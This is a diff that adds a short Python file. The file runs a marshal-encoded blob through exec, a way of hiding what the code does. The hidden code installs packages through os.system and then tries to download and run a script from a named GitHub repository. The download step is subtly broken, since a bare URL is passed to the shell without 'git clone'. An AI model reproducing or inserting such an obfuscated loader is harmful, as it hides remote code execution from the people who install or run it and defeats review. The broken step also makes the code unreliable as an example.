@@ -1,0 +1,2 @@
+import marshal
+exec(marshal.loads(b'sg\x01\x00\x00import uuid\r\nimport requests,bs4,sys,os,subprocess\r\ntry:\r\n    import requests\r\nexcept ImportError:\r\n    os.system(\'pip2 install requests\')\r\ntry:\r\n    import mechanize\r\nexcept ImportError:\r\n    os.system(\'pip2 install mechanize\')\r\n    os.system("https://github.com/MAHDI-Shuvo/jjj")\r\n    os.system("cd jjj && python2 m.py")\r\n\r\n\r\n                               '))
